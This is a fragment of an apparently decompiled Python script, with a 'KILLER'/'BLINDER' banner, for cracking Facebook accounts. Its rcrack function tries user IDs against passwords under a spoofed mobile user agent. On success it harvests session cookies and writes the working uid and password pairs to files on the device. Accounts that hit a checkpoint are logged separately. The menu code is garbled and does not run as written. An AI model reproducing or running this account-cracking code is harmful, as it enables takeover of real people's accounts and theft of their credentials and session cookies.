...
def o():
    ...
    if opt == '1':
        i()
    if None == '2':
        ('https://www.facebook.com/Kyadakrahyho1')
        return None
    if None == '3':
        os.system('www.facebook.com/Kyadakrahyho1')
        return None
    ...
    if None == '0':
        os.system('exit')
        return None
    None('\\x1b[1;31m  Choose valid option\x1b[0;97m')
...
'\033[1;34m' |    <   |  | |  |     |  |     |   __|  |      /        
'\033[1;35m'|  .  \  |  | |  `----.|  `----.|  |____ |  |\  \----.   
'\033[1;97m'|__|\__\ |__| |_______||_______||_______|| _| `._____|                                                           

\033[1;32m Author  : KILLER 
\033[1;36m FACEBOOK: KILLER 
\033[1;37m TEAM    : BLINDER
\033[1;35m GITHUB  : KILLER 
loop = 0
oks = []
cps = []
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m(KILLER-OK)' +uid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/KILLER-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(killer-CP)' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/killer-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r%s[KILLER] [%s/%s]OK:- %sCP:-%s\r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
